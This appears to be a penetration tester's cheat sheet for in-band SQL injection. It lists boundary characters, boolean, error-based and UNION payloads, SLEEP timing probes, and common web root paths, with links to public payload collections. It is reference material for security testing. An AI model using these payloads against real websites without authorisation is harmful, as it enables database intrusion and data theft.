# In-Band SQL Query List

Search Tag: #helpers #sql-injection #webapp

## Change numeric value of parameter ID

- Before adding to the prefix next to the parameter value. Try to change the numeric value from the list below. Another way to confirm the possible SQL injection vulnerability:

```
id=0
id=-1
id=9999.99
```

- You can of course perform mathematical expressions to see if it responds.

```
id=2-1
```

## Boundaries

### Prefix SQL Query List

```
<whitespace>
'
"
\
')
")
```

### Suffix SQL Query List

#### MySQL

```
--
#
/*
--<whitespace>
-- -
-- //
;%00
`
AND ('abc'='abc
```

#### MSSQL

```
/*
-- //
;%00
```

## SQL Payloads

### Boolean-based Payloads

#### Generic SQL

```
OR 1=1
OR '1'='1'
OR 1=2
OR SLEEP(10)
AND 1=1
AND '1'='1'
AND 1=2
AND SLEEP(10)
```

### Error-based Payloads

#### Fields Enumeration

- Increment by determining the number of coulmns

```
ORDER BY n+1
GROUP BY n+1
```

#### Double Injection (SubQuery) Enumeration

```
OR 1=1 IN (SELECT @@VERSION)
AND 1=1 IN (SELECT @@VERSION)
```

### UNION Query Payloads

#### Fields Enumeration

```
UNION SELECT NULL, NULL, ... NULL
```

#### UNION Enumeration

```
UNION SELECT @@VERSION, NULL, ... NULL
```

## Common Web Root Directories

### Linux

```
/var/www/html/
/var/www/
/var/www/htdocs/
/var/www/sites/
/var/www/public/
/var/www/public_html/
/var/www/html/default/
/var/apache2/htdocs/
/var/www/nginx-default/
/usr/local/apache2/htdocs/
/usr/local/www/data/
/srv/www/
/srv/www/html/
/srv/www/htdocs/
/srv/www/sites/
/home/www/
/home/httpd/
/home/$USER/public_html/
/home/$USER/www/
```

### Windows

```
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www
```

---
## References

- [WebSec: SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)

- [PayloadsAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection)

- [PentestLab: SQL Injection Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

- [SecLists: Linux Web Root Directories](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)

- [SecLists: Windows Web Root Directories](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)

- [Sjoerd Langkemper: Finding common files in the webroot](https://www.sjoerdlangkemper.nl/2018/05/23/creating-a-dirsearch-list/)

- [Phrack.me: SQL Injection Cheatsheet](https://www.phrack.me/exploits/2020/07/09/SQL-Injection-primer.html)